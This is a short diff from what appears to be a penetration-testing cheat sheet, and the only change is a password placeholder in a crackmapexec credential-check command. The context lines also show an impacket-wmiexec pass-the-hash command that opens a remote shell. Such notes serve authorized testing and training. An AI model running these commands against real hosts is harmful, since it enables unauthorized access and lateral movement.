@@ -31,7 +31,7 @@ print binascii.hexlify(hash)
 
 ## Expoitation
 Check:
-`crackmapexec SERVICE <IP> -u '<USER>' -p PASS` hash: -H
+`crackmapexec SERVICE <IP> -u '<USER>' -p <PASS>` hash: -H
 
 Shell:
 `impacket-wmiexec -hashes '<HASH>' <USER>@<IP>`
